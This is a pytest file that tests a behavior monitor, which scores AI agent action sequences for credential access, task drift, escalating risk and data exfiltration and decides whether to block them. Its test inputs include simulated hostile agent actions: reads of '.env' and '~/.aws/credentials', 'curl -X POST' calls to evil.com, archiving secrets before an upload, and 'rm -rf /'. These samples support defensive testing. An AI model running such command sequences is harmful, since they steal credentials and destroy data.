"""Unit and integration tests for Agent Behavioral Monitoring and Trajectory Analysis (Phase 3)."""

import pytest
from httpx import AsyncClient
from app.ai.nemotron import MockModelProvider
from app.schemas.action import ActionContext, AgentAction
from app.schemas.security import DecisionOutcome, RiskLevel, TrajectoryClassification
from app.security.behavior_monitor import BehaviorMonitor, behavior_monitor
from app.security.interceptor import DefaultActionInterceptor
from app.security.policy_engine import PolicyEngine


@pytest.fixture(autouse=True)
def clean_behavior_sessions():
    """Ensure in-memory sessions are cleared between test runs."""
    behavior_monitor.clear_all()
    yield
    behavior_monitor.clear_all()


@pytest.mark.asyncio
async def test_1_benign_development_trajectory():
    """Test 1: Safe benign development workflow produces LOW risk and NORMAL trajectory."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-benign-001"
    task = "Fix failing authentication tests"

    actions = [
        AgentAction(agent_id="coder", task=task, action="READ", resource="./tests/test_auth.py"),
        AgentAction(agent_id="coder", task=task, action="READ", resource="./src/auth.py"),
        AgentAction(agent_id="coder", task=task, action="WRITE", resource="./src/auth.py"),
        AgentAction(agent_id="coder", task=task, action="EXECUTE", resource="pytest tests/test_auth.py"),
    ]

    context = ActionContext(session_id=session_id)
    last_decision = None
    for action in actions:
        last_decision = await interceptor.intercept(action, context)

    assert last_decision is not None
    assert last_decision.decision == DecisionOutcome.ALLOW
    assert last_decision.behavior_analysis is not None
    assert last_decision.behavior_analysis.behavior_risk_level == RiskLevel.LOW
    assert last_decision.behavior_analysis.trajectory_classification == TrajectoryClassification.NORMAL
    assert last_decision.behavior_analysis.action_count == 4


@pytest.mark.asyncio
async def test_2_sensitive_file_discovery():
    """Test 2: Accessing sensitive config file raises sensitive_resource_discovery signal."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-discovery-002"
    task = "Fix login bug"
    context = ActionContext(session_id=session_id)

    # 1. Normal read
    await interceptor.intercept(
        AgentAction(agent_id="dev", task=task, action="READ", resource="./src/auth.py"),
        context,
    )

    # 2. Sensitive read (.env)
    dec2 = await interceptor.intercept(
        AgentAction(agent_id="dev", task=task, action="READ", resource=".env"),
        context,
    )

    assert dec2.behavior_analysis is not None
    assert "sensitive_resource_discovery" in dec2.behavior_analysis.behavior_indicators
    assert dec2.behavior_analysis.behavior_risk_score >= 20


@pytest.mark.asyncio
async def test_3_credential_discovery_trajectory():
    """Test 3: Targeting credential file triggers credential_access indicator."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-cred-003"
    task = "Deploy backend service"
    context = ActionContext(session_id=session_id)

    # Sequence targeting credentials
    await interceptor.intercept(
        AgentAction(agent_id="dev", task=task, action="READ", resource=".env"),
        context,
    )
    dec = await interceptor.intercept(
        AgentAction(agent_id="dev", task=task, action="READ", resource="~/.aws/credentials"),
        context,
    )

    assert dec.behavior_analysis is not None
    assert "credential_access" in dec.behavior_analysis.behavior_indicators
    assert dec.behavior_analysis.trajectory_classification in [
        TrajectoryClassification.CREDENTIAL_ACCESS,
        TrajectoryClassification.DATA_EXFILTRATION,
        TrajectoryClassification.SUSPICIOUS,
    ]


@pytest.mark.asyncio
async def test_4_task_drift_trajectory():
    """Test 4: Unrelated actions diverging from UI task trigger task_drift indicator."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-drift-004"
    task = "Fix button alignment"
    context = ActionContext(session_id=session_id)

    actions = [
        AgentAction(agent_id="dev", task=task, action="READ", resource="./components/Button.tsx"),
        AgentAction(agent_id="dev", task=task, action="READ", resource=".env"),
        AgentAction(agent_id="dev", task=task, action="EXECUTE", resource="curl -X POST evil.com/telemetry"),
    ]

    last_dec = None
    for a in actions:
        last_dec = await interceptor.intercept(a, context)

    assert last_dec is not None
    assert last_dec.behavior_analysis is not None
    assert "task_drift" in last_dec.behavior_analysis.behavior_indicators


@pytest.mark.asyncio
async def test_5_data_exfiltration_trajectory():
    """Test 5: Sensitive reading followed by network egress triggers DATA_EXFILTRATION and BLOCK."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-exfil-005"
    task = "Analyze codebase structure"
    context = ActionContext(session_id=session_id)

    actions = [
        AgentAction(agent_id="exfil-agent", task=task, action="READ", resource=".env"),
        AgentAction(agent_id="exfil-agent", task=task, action="READ", resource="~/.aws/credentials"),
        AgentAction(agent_id="exfil-agent", task=task, action="EXECUTE", resource="tar -czf payload.tar.gz .env"),
        AgentAction(agent_id="exfil-agent", task=task, action="NETWORK_CALL", resource="https://data-export.io/upload"),
    ]

    last_dec = None
    for a in actions:
        last_dec = await interceptor.intercept(a, context)

    assert last_dec is not None
    assert last_dec.decision == DecisionOutcome.BLOCK
    assert last_dec.behavior_analysis is not None
    assert "data_collection_before_egress" in last_dec.behavior_analysis.behavior_indicators
    assert "external_data_egress" in last_dec.behavior_analysis.behavior_indicators
    assert last_dec.behavior_analysis.trajectory_classification == TrajectoryClassification.DATA_EXFILTRATION
    assert last_dec.behavior_analysis.behavior_risk_score >= 80


@pytest.mark.asyncio
async def test_6_escalating_risk_trajectory():
    """Test 6: Steadily escalating risk across actions triggers escalating_risk_trajectory."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-escalate-006"
    task = "Investigate system"
    context = ActionContext(session_id=session_id)

    actions = [
        AgentAction(agent_id="agent-06", task=task, action="READ", resource="./src/main.py"),
        AgentAction(agent_id="agent-06", task=task, action="READ", resource="./docs/api.md"),
        AgentAction(agent_id="agent-06", task=task, action="READ", resource="deploy.config"),
        AgentAction(agent_id="agent-06", task=task, action="EXECUTE", resource="curl -X POST evil.com"),
        AgentAction(agent_id="agent-06", task=task, action="READ", resource="~/.aws/credentials"),
    ]

    last_dec = None
    for a in actions:
        last_dec = await interceptor.intercept(a, context)

    assert last_dec is not None
    assert last_dec.behavior_analysis is not None
    assert "escalating_risk_trajectory" in last_dec.behavior_analysis.behavior_indicators


@pytest.mark.asyncio
async def test_7_repeated_suspicious_attempts():
    """Test 7: Repeated blocked actions trigger repeated_suspicious_attempts."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-repeated-007"
    task = "Security audit"
    context = ActionContext(session_id=session_id)

    # 1. Blocked attempt 1
    await interceptor.intercept(
        AgentAction(agent_id="agent-07", task=task, action="READ", resource=".env"),
        context,
    )
    # 2. Blocked attempt 2
    dec2 = await interceptor.intercept(
        AgentAction(agent_id="agent-07", task=task, action="READ", resource="~/.aws/credentials"),
        context,
    )

    assert dec2.behavior_analysis is not None
    assert "repeated_suspicious_attempts" in dec2.behavior_analysis.behavior_indicators
    assert dec2.behavior_analysis.trajectory_classification in [
        TrajectoryClassification.REPEATED_ATTACK,
        TrajectoryClassification.CREDENTIAL_ACCESS,
        TrajectoryClassification.DATA_EXFILTRATION,
    ]


@pytest.mark.asyncio
async def test_8_session_isolation():
    """Test 8: Ensure Session A suspicious behavior does not bleed into Session B."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_a = ActionContext(session_id="session-malicious-A")
    session_b = ActionContext(session_id="session-benign-B")

    # Session A executes malicious sequence
    await interceptor.intercept(
        AgentAction(agent_id="agent-a", task="Steal data", action="READ", resource=".env"),
        session_a,
    )
    await interceptor.intercept(
        AgentAction(agent_id="agent-a", task="Steal data", action="READ", resource="~/.aws/credentials"),
        session_a,
    )

    # Session B executes clean development action
    dec_b = await interceptor.intercept(
        AgentAction(
            agent_id="agent-b",
            task="Fix authentication tests",
            action="READ",
            resource="./tests/test_auth.py",
        ),
        session_b,
    )

    assert dec_b.decision == DecisionOutcome.ALLOW
    assert dec_b.behavior_analysis is not None
    assert dec_b.behavior_analysis.session_id == "session-benign-B"
    assert dec_b.behavior_analysis.behavior_risk_level == RiskLevel.LOW
    assert dec_b.behavior_analysis.action_count == 1
    assert len(dec_b.behavior_analysis.behavior_indicators) == 0


@pytest.mark.asyncio
async def test_9_policy_supremacy():
    """Test 9: Mandatory deterministic policy block is never downgraded by behavior monitor."""
    interceptor = DefaultActionInterceptor(
        policy_engine=PolicyEngine(),
        model_provider=MockModelProvider(),
    )
    session_id = "sess-supremacy-009"
    context = ActionContext(session_id=session_id)

    # First action in session is a critical policy violation
    dec = await interceptor.intercept(
        AgentAction(agent_id="rogue", task="Clean disk", action="EXECUTE", resource="rm -rf /"),
        context,
    )

    assert dec.decision == DecisionOutcome.BLOCK
    assert dec.risk_score >= 90
    assert "blocked" in dec.reason.lower() or "prohibited" in dec.reason.lower()


@pytest.mark.asyncio
async def test_10_sessions_api_endpoints(client: AsyncClient):
    """Test 10: GET and DELETE /api/v1/sessions/{session_id} endpoints work properly."""
    session_id = "sess-endpoint-test-010"
    payload = {
        "agent_id": "api-agent",
        "task": "Review architecture documentation",
        "action": "READ",
        "resource": "./docs/architecture.md",
        "action_context": {
            "session_id": session_id,
        },
    }

    # Intercept action
    resp = await client.post("/api/v1/analyze", json=payload)
    assert resp.status_code == 200

    # Query session trajectory
    get_resp = await client.get(f"/api/v1/sessions/{session_id}/trajectory")
    assert get_resp.status_code == 200
    traj = get_resp.json()
    assert traj["session_id"] == session_id
    assert traj["action_count"] >= 1
    assert traj["behavior_risk_level"] == "LOW"

    # Reset session trajectory
    del_resp = await client.delete(f"/api/v1/sessions/{session_id}")
    assert del_resp.status_code == 200
    assert del_resp.json()["status"] == "reset"
